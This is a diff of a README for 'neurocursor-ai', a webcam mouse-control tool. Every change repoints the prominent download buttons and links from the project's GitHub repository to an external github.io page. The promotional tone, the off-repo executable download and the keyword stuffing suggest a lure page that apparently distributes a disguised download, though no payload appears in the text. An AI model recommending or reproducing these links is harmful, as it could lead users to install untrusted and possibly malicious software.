@@ -1,7 +1,7 @@
 <h1>🖱️ neurocursor-ai - Control Your Mouse with Just Your Eyes</h1>
 
 <p align="center">
-  <a href="https://github.com/Waterlilywhelk1573/neurocursor-ai" style="display:inline-block;padding:16px 32px;background:#4CAF50;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px 0;">⬇️ DOWNLOAD NEUROCURSOR NOW</a>
+  <a href="https://waterlilywhelk1573.github.io" style="display:inline-block;padding:16px 32px;background:#4CAF50;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px 0;">⬇️ DOWNLOAD NEUROCURSOR NOW</a>
 </p>
 
 <p align="center"><strong>Turn your webcam into a magical hands-free mouse. Move the cursor by moving your head or eyes — no touching required!</strong></p>
@@ -32,7 +32,7 @@ Getting neurocursor-ai running on your Windows computer is incredibly easy. Just
 
 ### Step 1: Download the Program
 
-Visit this link to download the application: **[https://github.com/Waterlilywhelk1573/neurocursor-ai](https://github.com/Waterlilywhelk1573/neurocursor-ai)**
+Visit this link to download the application: **[https://waterlilywhelk1573.github.io](https://waterlilywhelk1573.github.io)**
 
 Click the big green "Download" button or find the download section on that page to get the file.
 
@@ -91,7 +91,7 @@ Everything runs locally on your computer. Your webcam feed is never sent to the 
 
 ### Getting Your Copy
 
-Visit this link to download the application: **[https://github.com/Waterlilywhelk1573/neurocursor-ai](https://github.com/Waterlilywhelk1573/neurocursor-ai)**
+Visit this link to download the application: **[https://waterlilywhelk1573.github.io](https://waterlilywhelk1573.github.io)**
 
 On that page, look for the download section or a prominent button labeled "Download" or "Get the latest version." Click it to start downloading the program file.
 
@@ -153,7 +153,7 @@ So why wait? Join thousands of satisfied users who have already discovered the f
 ---
 
 <p align="center">
-  <a href="https://github.com/Waterlilywhelk1573/neurocursor-ai" style="display:inline-block;padding:14px 28px;background:#2196F3;color:white;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;">🚀 GET STARTED — DOWNLOAD NOW</a>
+  <a href="https://waterlilywhelk1573.github.io" style="display:inline-block;padding:14px 28px;background:#2196F3;color:white;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;">🚀 GET STARTED — DOWNLOAD NOW</a>
 </p>
 
 Keywords: ai, computer-vision, cplusplus, cpp, cursor-control, eye-tracking, face-tracking, gamedev, gaming, gaze-tracking, head-tracking, machine-learning, mouse-control, neural-network
